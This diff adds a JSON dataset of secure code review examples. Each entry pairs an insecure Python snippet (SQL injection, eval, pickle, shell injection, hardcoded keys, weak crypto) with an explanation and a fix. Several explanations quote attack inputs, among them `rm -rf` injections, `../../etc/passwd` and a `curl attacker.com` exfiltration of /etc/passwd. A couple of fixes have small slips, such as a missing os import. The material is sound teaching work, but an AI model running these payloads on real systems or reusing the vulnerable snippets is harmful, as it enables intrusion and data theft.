@@ -1,0 +1,82 @@
+[
+  {
+    "instruction": "Review this code:\n\ndef get_user(cur, name):\n    cur.execute(f\"SELECT * FROM users WHERE username = '{name}'\")\n    return cur.fetchone()",
+    "output": "**Issue:** SQL injection: the username is interpolated directly into the query string.\n**Why:** An input like `admin' OR '1'='1` escapes the literal and can dump or wipe the table.\n**Fix:**\ndef get_user(cur, name):\n    cur.execute('SELECT * FROM users WHERE username = ?', (name,))\n    return cur.fetchone()"
+  },
+  {
+    "instruction": "Review this code:\n\ndef run_calc(expr):\n    return eval(expr)\n\nprint(run_calc(input('enter expression: ')))",
+    "output": "**Issue:** eval() executes arbitrary code supplied by the user.\n**Why:** `expr` can be `__import__('os').system('rm -rf /')`, giving the attacker a shell.\n**Fix:**\ndef run_calc(expr):\n    import ast, operator\n    ops = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv}\n    def ev(node):\n        if isinstance(node, ast.Expression): return ev(node.body)\n        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)): return node.value\n        if isinstance(node, ast.BinOp) and type(node.op) in ops: return ops[type(node.op)](ev(node.left), ev(node.right))\n        raise ValueError('unsupported expression')\n    return ev(ast.parse(expr, mode='eval'))"
+  },
+  {
+    "instruction": "Review this code:\n\ndef load_state(path):\n    with open(path, 'rb') as f:\n        return pickle.load(f)\n\nstate = load_state(request.args.get('file'))",
+    "output": "**Issue:** Unpickling data from an untrusted source.\n**Why:** pickle can instantiate arbitrary classes, so a crafted file runs attacker code during load.\n**Fix:**\ndef load_state(path):\n    with open(path, 'rb') as f:\n        return json.load(f)\n\n# or, if pickle is required, only load files you wrote yourself and verify integrity with hmac."
+  },
+  {
+    "instruction": "Review this code:\n\nimport yaml\n\ndef parse_config(raw):\n    return yaml.load(raw)\n\nconfig = parse_config(request.data)",
+    "output": "**Issue:** yaml.load without a safe loader on untrusted input.\n**Why:** Full YAML can construct Python objects (`!!python/object/apply:os.system`), which is remote code execution.\n**Fix:**\nimport yaml\n\ndef parse_config(raw):\n    return yaml.safe_load(raw)"
+  },
+  {
+    "instruction": "Review this code:\n\nimport boto3\n\ns3 = boto3.client('s3', aws_access_key_id='AKIAEXAMPLEKEY1234', aws_secret_access_key='wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY')\n\ndef upload(bucket, key, body):\n    s3.put_object(Bucket=bucket, Key=key, Body=body)",
+    "output": "**Issue:** AWS credentials are hardcoded in source.\n**Why:** Anyone with repo access (or anyone if the repo is public) can take over the AWS account; the key also ends up in git history forever.\n**Fix:**\nimport os, boto3\n\ns3 = boto3.client(\n    's3',\n    aws_access_key_id=os.environ['AWS_ACCESS_KEY_ID'],\n    aws_secret_access_key=os.environ['AWS_SECRET_ACCESS_KEY'],\n)\n# Rotate the leaked key in IAM immediately."
+  },
+  {
+    "instruction": "Review this code:\n\nimport os\n\ndef ping(host):\n    os.system('ping -c 1 ' + host)",
+    "output": "**Issue:** Shell command injection through string concatenation.\n**Why:** A host value of `8.8.8.8; rm -rf ~` is executed by the shell exactly as written.\n**Fix:**\nimport subprocess\n\ndef ping(host):\n    subprocess.run(['ping', '-c', '1', host], check=True, capture_output=True)"
+  },
+  {
+    "instruction": "Review this code:\n\nimport hashlib\n\ndef set_password(user, password):\n    user.pw_hash = hashlib.md5(password.encode()).hexdigest()\n    db.commit()",
+    "output": "**Issue:** Passwords hashed with unsalted MD5.\n**Why:** MD5 is broken and fast, so a leaked hash table is cracked in minutes with rainbow tables or GPUs.\n**Fix:**\nimport bcrypt\n\ndef set_password(user, password):\n    user.pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()\n    db.commit()\n\ndef check_password(user, password):\n    return bcrypt.checkpw(password.encode(), user.pw_hash.encode())"
+  },
+  {
+    "instruction": "Review this code:\n\nimport os\n\ndef read_user_file(filename):\n    path = '/data/uploads/' + filename\n    with open(path) as f:\n        return f.read()",
+    "output": "**Issue:** Path traversal: filename is concatenated without validation.\n**Why:** `../../etc/passwd` escapes the upload directory and reads arbitrary files on the server.\n**Fix:**\nimport os\n\ndef read_user_file(filename):\n    base = '/data/uploads'\n    path = os.path.realpath(os.path.join(base, filename))\n    if not path.startswith(os.path.realpath(base) + os.sep):\n        raise ValueError('invalid path')\n    with open(path) as f:\n        return f.read()"
+  },
+  {
+    "instruction": "Review this code:\n\nimport random, string\n\ndef make_reset_token():\n    return ''.join(random.choice(string.ascii_letters) for _ in range(32))",
+    "output": "**Issue:** Security token generated with the non-cryptographic random module.\n**Why:** random is a deterministic PRNG; an attacker who sees a few outputs can predict future password-reset tokens.\n**Fix:**\nimport secrets\n\ndef make_reset_token():\n    return secrets.token_urlsafe(32)"
+  },
+  {
+    "instruction": "Review this code:\n\nimport subprocess\n\ndef archive_logs(name):\n    cmd = 'tar czf /backup/' + name + '.tgz /var/log/' + name\n    subprocess.run(cmd, shell=True)",
+    "output": "**Issue:** shell=True combined with untrusted interpolation.\n**Why:** A name like `logs; curl attacker.com/exfil?d=$(cat /etc/passwd)` runs extra commands with the app's privileges.\n**Fix:**\nimport subprocess\n\ndef archive_logs(name):\n    if '/' in name or '..' in name:\n        raise ValueError('invalid name')\n    subprocess.run(['tar', 'czf', f'/backup/{name}.tgz', f'/var/log/{name}'], check=True)"
+  },
+  {
+    "instruction": "Review this code:\n\nfrom flask import Flask\napp = Flask(__name__)\n\n@app.route('/hello/<name>')\ndef hello(name):\n    return f'Hello {name}'\n\napp.run(debug=True, host='0.0.0.0')",
+    "output": "**Issue:** Flask debug mode enabled on a publicly bound server.\n**Why:** The Werkzeug debugger exposes an interactive console to anyone who triggers an error, i.e. full remote code execution.\n**Fix:**\napp.run(debug=False, host='127.0.0.1')\n# enable debug only via env var and never bind the debugger to 0.0.0.0\napp.run(debug=os.environ.get('FLASK_DEBUG') == '1')"
+  },
+  {
+    "instruction": "Review this code:\n\n@app.errorhandler(Exception)\ndef handle_error(e):\n    return str(e), 500",
+    "output": "**Issue:** Raw exception text (and often stack traces) returned to the client.\n**Why:** Messages like `psycopg2.errors.UndefinedTable: relation \"users\" does not exist` reveal schema, file paths and library versions to attackers.\n**Fix:**\nimport logging, traceback\n\n@app.errorhandler(Exception)\ndef handle_error(e):\n    logging.exception('request failed')\n    return {'error': 'internal server error'}, 500"
+  },
+  {
+    "instruction": "Review this code:\n\nimport tempfile\n\ndef store_upload(data):\n    path = tempfile.mktemp()\n    with open(path, 'wb') as f:\n        f.write(data)\n    return path",
+    "output": "**Issue:** tempfile.mktemp() is a race-prone API.\n**Why:** Between name creation and file creation another process (or attacker) can create a symlink there, so you overwrite the wrong file.\n**Fix:**\nimport tempfile\n\ndef store_upload(data):\n    fd, path = tempfile.mkstemp()\n    with os.fdopen(fd, 'wb') as f:\n        f.write(data)\n    return path"
+  },
+  {
+    "instruction": "Review this code:\n\nimport hmac, hashlib\n\ndef token_matches(token, expected):\n    return hashlib.sha256(token.encode()).hexdigest() == hashlib.sha256(expected.encode()).hexdigest()",
+    "output": "**Issue:** Secret comparison with == short-circuits on the first differing byte.\n**Why:** The timing difference leaks how many leading characters matched, letting an attacker brute-force the token byte by byte.\n**Fix:**\nimport hmac\n\ndef token_matches(token, expected):\n    return hmac.compare_digest(token.encode(), expected.encode())"
+  },
+  {
+    "instruction": "Review this code:\n\nimport xml.etree.ElementTree as ET\n\ndef load_products(xml_data):\n    root = ET.fromstring(xml_data)\n    return [c.text for c in root.findall('product')]",
+    "output": "**Issue:** Parsing untrusted XML with a parser that resolves external entities.\n**Why:** A DOCTYPE pointing at file:///etc/passwd or an internal URL enables XXE file disclosure and SSRF.\n**Fix:**\nfrom defusedxml import ElementTree as ET\n\ndef load_products(xml_data):\n    root = ET.fromstring(xml_data)\n    return [c.text for c in root.findall('product')]"
+  },
+  {
+    "instruction": "Review this code:\n\napp.config['ACCESS_CONTROL_ALLOW_ORIGIN'] = '*'\napp.config['ACCESS_CONTROL_ALLOW_CREDENTIALS'] = True\n\n@app.after_request\ndef cors(resp):\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    resp.headers['Access-Control-Allow-Credentials'] = 'true'\n    return resp",
+    "output": "**Issue:** Wildcard CORS origin combined with Allow-Credentials.\n**Why:** It makes the browser attach the user's cookies to cross-site requests, so any website can act as the logged-in user.\n**Fix:**\nALLOWED = {'https://app.example.com'}\n\n@app.after_request\ndef cors(resp):\n    origin = request.headers.get('Origin')\n    if origin in ALLOWED:\n        resp.headers['Access-Control-Allow-Origin'] = origin\n        resp.headers['Access-Control-Allow-Credentials'] = 'true'\n        resp.headers['Vary'] = 'Origin'\n    return resp"
+  },
+  {
+    "instruction": "Review this code:\n\ndef login(username, password):\n    logger.info(f'login attempt user={username} password={password}')\n    user = db.find(username, password)\n    if user:\n        logger.info('login success')",
+    "output": "**Issue:** Password written to the application log.\n**Why:** Logs are shipped to third parties and kept far longer than the password; one log leak compromises every account.\n**Fix:**\nlogger.info('login attempt user=%s', username)\n# never log secrets; hash the password before comparing anyway (see password storage review)"
+  },
+  {
+    "instruction": "Review this code:\n\nimport os, shutil\n\ndef setup_workspace(path):\n    if not os.path.exists(path):\n        os.makedirs(path, mode=0o777)\n    shutil.copy('app.db', path)\n    os.chmod(path + '/app.db', 0o777)",
+    "output": "**Issue:** Directories and the database file created world-writable (0777).\n**Why:** Any local user can overwrite app.db with their own data or replace it with a symlink, escalating privileges.\n**Fix:**\nos.makedirs(path, mode=0o700, exist_ok=True)\nos.chmod(os.path.join(path, 'app.db'), 0o600)"
+  },
+  {
+    "instruction": "Review this code:\n\nimport re\n\ndef validate_username(u):\n    return bool(re.fullmatch(r'(a+)+$', u))",
+    "output": "**Issue:** Catastrophic backtracking regex (ReDoS).\n**Why:** `(a+)+` against a long string of a's followed by one other char takes exponential time, so one request ties up a worker forever.\n**Fix:**\nimport re\n\ndef validate_username(u):\n    return bool(re.fullmatch(r'a+', u))\n# prefer bounded patterns like r'^[a-z]{1,32}$' for user input"
+  },
+  {
+    "instruction": "Review this code:\n\nimport requests\n\ndef fetch(url):\n    r = requests.get(url, verify=False)\n    return r.json()",
+    "output": "**Issue:** TLS certificate verification disabled.\n**Why:** Anyone on the network can MITM the connection and read or rewrite the response; warnings are explicitly ignored.\n**Fix:**\nimport requests\n\ndef fetch(url):\n    r = requests.get(url, verify=True, timeout=10)\n    r.raise_for_status()\n    return r.json()"
+  }
+]
